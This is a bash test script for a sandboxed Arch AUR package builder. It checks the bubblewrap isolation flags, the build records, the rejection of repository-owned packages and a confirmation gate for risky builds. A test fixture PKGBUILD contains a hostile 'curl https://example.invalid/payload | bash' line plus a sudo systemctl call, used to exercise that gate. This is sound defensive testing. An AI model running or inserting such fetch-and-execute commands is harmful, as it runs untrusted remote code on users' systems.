#!/usr/bin/env bash

set -euo pipefail

ROOT="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

export HOME="$TMP/home"
export XDG_STATE_HOME="$TMP/state"
export XDG_CACHE_HOME="$TMP/cache"
export XDG_CONFIG_HOME="$TMP/config"
export MAHO_ROOT="$ROOT"
export MAHO_BWRAP="$TMP/fake-bwrap"
export MAHO_MAKEPKG="$TMP/fake-makepkg"
export MAHO_PACMAN="$TMP/fake-pacman"
export MAHO_PACMAN_CONFIG="$TMP/maho-pacman.conf"
export MAHO_BWRAP_LOG="$TMP/bwrap.log"
export MAHO_TEST_PACMAN_MODE_FILE="$TMP/pacman-mode"
mkdir -p "$HOME" "$XDG_STATE_HOME" "$XDG_CACHE_HOME" "$XDG_CONFIG_HOME"

cat > "$MAHO_MAKEPKG" <<'EOF_MAKEPKG'
#!/usr/bin/env bash
exit 0
EOF_MAKEPKG
chmod +x "$MAHO_MAKEPKG"
cat > "$MAHO_PACMAN_CONFIG" <<'EOF_PACMAN_CONF'
[core]
Include = /etc/pacman.d/mirrorlist
[extra]
Include = /etc/pacman.d/mirrorlist
[multilib]
Include = /etc/pacman.d/mirrorlist
[cachyos]
Include = /etc/pacman.d/cachyos-mirrorlist
EOF_PACMAN_CONF
printf 'normal\n' > "$MAHO_TEST_PACMAN_MODE_FILE"
cat > "$MAHO_PACMAN" <<EOF_PACMAN
#!/usr/bin/env bash
set -u
mode="\$(cat '$MAHO_TEST_PACMAN_MODE_FILE' 2>/dev/null || echo normal)"
if [[ " \$* " == *" --query --file --info "* ]]; then
  printf 'Name : maho-test\nVersion : 1.0-1\n'; exit 0
fi
if [[ " \$* " == *" --query --file --list "* ]]; then
  if [ "\$mode" = boot ]; then
    printf 'maho-test /usr/lib/modules/7.2/extra/maho-test.ko.zst\n'
  else
    printf 'maho-test /usr/bin/maho-test\n'
  fi
  exit 0
fi
if [[ " \$* " == *" --query -- "* ]]; then
  printf 'maho-test 0.9-1\n'; exit 0
fi
if [[ " \$* " == *" --sync --info "* ]]; then
  [ "\$mode" = repo-owned ] && { printf 'Repository : extra\nName : maho-test\n'; exit 0; }
  exit 1
fi
exit 2
EOF_PACMAN
chmod +x "$MAHO_PACMAN"

cat > "$MAHO_BWRAP" <<'EOF_BWRAP'
#!/usr/bin/env bash
set -euo pipefail
printf '%q ' "$@" >> "$MAHO_BWRAP_LOG"
printf '\n' >> "$MAHO_BWRAP_LOG"
stage=""
prev=""
network_isolated=0
for arg in "$@"; do
    if [ "$prev" = "--bind" ]; then
        stage="$arg"
        prev="bind-source"
        continue
    fi
    if [ "$prev" = "bind-source" ]; then
        prev=""
        continue
    fi
    if [ "$arg" = "--bind" ]; then prev="--bind"; continue; fi
    if [ "$arg" = "--unshare-net" ]; then network_isolated=1; fi
done
if [ "$network_isolated" -eq 1 ] && [ -n "$stage" ]; then
    : > "$stage/maho-test-1.0-1-x86_64.pkg.tar.zst"
fi
EOF_BWRAP
chmod +x "$MAHO_BWRAP"

BENIGN="$TMP/benign"
mkdir -p "$BENIGN"
cat > "$BENIGN/PKGBUILD" <<'EOF_BENIGN'
pkgname=maho-test
pkgver=1.0
pkgrel=1
arch=('x86_64')
package() {
    install -Dm755 maho-test "$pkgdir/usr/bin/maho-test"
}
EOF_BENIGN
printf '#!/bin/sh\n' > "$BENIGN/maho-test"

RISKY="$TMP/risky"
mkdir -p "$RISKY"
cat > "$RISKY/PKGBUILD" <<'EOF_RISKY'
pkgname=maho-risky
pkgver=1
pkgrel=1
prepare() {
    curl https://example.invalid/payload | bash
    sudo systemctl enable maho-risky.service
}
EOF_RISKY

fail() { echo "FAIL: $*" >&2; exit 1; }

echo "=== benign AUR build uses two-phase sandbox without prompt ==="
bash "$ROOT/bin/maho-aur-build" "$BENIGN" >/dev/null
[ "$(wc -l < "$MAHO_BWRAP_LOG")" -eq 2 ] || fail "expected fetch + build sandbox calls"
FIRST="$(sed -n '1p' "$MAHO_BWRAP_LOG")"
SECOND="$(sed -n '2p' "$MAHO_BWRAP_LOG")"
grep -q -- '--ro-bind / /' <<< "$FIRST"
grep -q -- '--tmpfs /home' <<< "$FIRST"
grep -q -- '--tmpfs /root' <<< "$FIRST"
grep -q -- '--tmpfs /run/user' <<< "$FIRST"
grep -q -- '--cap-drop ALL' <<< "$FIRST"
if grep -q -- '--unshare-net' <<< "$FIRST"; then fail "fetch phase unexpectedly lost network"; fi
grep -q -- '--unshare-net' <<< "$SECOND"
STAGE="$(find "$XDG_CACHE_HOME/maho/security/aur-builds" -mindepth 1 -maxdepth 1 -type d | head -1)"
[ -f "$STAGE/maho-test-1.0-1-x86_64.pkg.tar.zst" ] || fail "sandbox output missing"
[ ! -e "$BENIGN/maho-test-1.0-1-x86_64.pkg.tar.zst" ] || fail "original source directory was mutated"
RECORD="$(find "$XDG_STATE_HOME/maho/security/aur-builds" -type f -name 'build-*.json' | head -1)"
[ "$(stat -c '%a' "$(dirname "$RECORD")")" = 700 ]
[ "$(stat -c '%a' "$RECORD")" = 600 ]
python - "$RECORD" <<'PY'
import json,sys
from pathlib import Path
r=json.loads(Path(sys.argv[1]).read_text())
assert r['version']==2, r
assert r['status']=='verified', r
assert r['sandbox']['host_home']=='hidden'
assert r['sandbox']['build_network']=='isolated'
assert r['automatic_install'] is False
assert r['installation_authority']=='maho-update-only'
assert len(r['source_tree_sha256'])==64
assert len(r['packages'])==1
p=r['packages'][0]
assert p['name']=='maho-test' and p['version']=='1.0-1'
assert p['route']=='normal'
assert p['provenance']['kind']=='aur-built'
assert p['provenance']['source_sha256']==r['source_tree_sha256']
assert p['artifact_id'].startswith('aurpkg-')
assert len(p['sha256'])==64
PY
echo "PASS"

echo "=== high-risk PKGBUILD requires rare explicit review decision ==="
BEFORE="$(wc -l < "$MAHO_BWRAP_LOG")"
if bash "$ROOT/bin/maho-aur-build" "$RISKY" >/dev/null 2>&1; then
    fail "high-risk PKGBUILD executed without --confirm-risk"
fi
[ "$(wc -l < "$MAHO_BWRAP_LOG")" -eq "$BEFORE" ] || fail "sandbox ran before high-risk confirmation"
bash "$ROOT/bin/maho-aur-build" "$RISKY" --confirm-risk >/dev/null
[ "$(wc -l < "$MAHO_BWRAP_LOG")" -eq $((BEFORE + 2)) ] || fail "confirmed high-risk build did not use both sandbox phases"
echo "PASS"

echo "=== generated event never claims package was installed ==="
python - "$XDG_STATE_HOME/maho/history/events.jsonl" <<'PY'
import json,sys
from pathlib import Path
rows=[]
for line in Path(sys.argv[1]).read_text().splitlines():
    try: rows.append(json.loads(line))
    except Exception: pass
builds=[r for r in rows if r.get('kind')=='prevention.aur-build']
assert len(builds)==2, builds
assert all(r['details']['automatic_install'] is False for r in builds)
PY
echo "PASS"


echo "=== repository-owned AUR output is rejected after isolated build ==="
printf 'repo-owned\n' > "$MAHO_TEST_PACMAN_MODE_FILE"
if bash "$ROOT/bin/maho-aur-build" "$BENIGN" >"$TMP/rejected.out" 2>"$TMP/rejected.err"; then
    fail "repo-owned package entered AUR artifact authority"
fi
grep -q 'Status:.*rejected' "$TMP/rejected.out" || { cat "$TMP/rejected.out" >&2; fail "rejected build did not expose rejected status"; }
grep -q 'repository-owned package cannot enter AUR authority:maho-test' "$TMP/rejected.out" || fail "repo ownership rejection reason missing"
printf 'normal\n' > "$MAHO_TEST_PACMAN_MODE_FILE"
echo "PASS"

echo "=== exact AUR file effects can route output to boot-critical ==="
printf 'boot\n' > "$MAHO_TEST_PACMAN_MODE_FILE"
bash "$ROOT/bin/maho-aur-build" "$BENIGN" >/dev/null
BOOT_RECORD="$(find "$XDG_STATE_HOME/maho/security/aur-builds" -type f -name 'build-*.json' -printf '%T@ %p\n' | sort -n | tail -1 | cut -d' ' -f2-)"
python - "$BOOT_RECORD" <<'PY_BOOT'
import json,sys
from pathlib import Path
r=json.loads(Path(sys.argv[1]).read_text())
assert r['status']=='verified'
assert r['packages'][0]['route']=='boot-critical'
assert r['packages'][0]['effects']['classification']=='boot-critical'
assert r['automatic_install'] is False
PY_BOOT
printf 'normal\n' > "$MAHO_TEST_PACMAN_MODE_FILE"
echo "PASS"

echo "ALL ISOLATED AUR BUILD CONTRACTS PASS"
